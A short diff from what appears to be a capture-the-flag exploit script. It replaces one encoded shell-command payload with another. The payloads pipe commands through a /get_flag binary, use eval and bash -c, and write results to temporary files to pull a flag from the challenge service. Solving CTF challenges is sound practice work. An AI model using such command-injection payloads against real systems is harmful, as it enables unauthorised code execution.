@@ -112,8 +112,7 @@ def go():
 
     sock.recvuntil(r"(make sure to try 'thisfile')")
 
-    #payload = command_to_fancy(r"bash -c 'expr $(grep 1 /tmp/foobarbaz)'|/get_flag>/tmp/foobarbaz")
-    payload = command_to_fancy(r'eval "echo \$(($(cat /tmp/a)))"|/get_flag|(read l;read l;echo $l>/tmp/a;cat;)')
+    payload = command_to_fancy(r"bash -c 'expr $(grep + tmp/a)'|/get_flag>tmp/a;cat tmp/a")
     #payload = command_to_fancy(r"/get_flag")
     reps = 3
 
